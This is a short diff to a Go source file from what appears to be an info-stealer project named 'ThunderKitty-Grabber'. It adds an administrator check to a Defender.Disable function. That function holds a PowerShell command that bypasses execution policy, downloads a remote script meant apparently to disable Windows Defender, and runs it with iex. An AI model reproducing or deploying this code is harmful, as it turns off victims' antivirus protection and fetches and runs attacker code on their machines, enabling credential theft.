@@ -1,11 +1,15 @@
 package Defender
 
 import (
+	Persistence "ThunderKitty-Grabber/utils/persistence"
 	"syscall"
 	"unsafe"
 )
 
 func Disable() {
+	if !Persistence.IsAdmin() {
+		return
+	}
 	rizzma := `powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/EvilBytecode/ThunderKitty/main/powershellstuff/defenderstuff.ps1')|iex"`
 	sigma, _ := syscall.UTF16PtrFromString(rizzma)
 
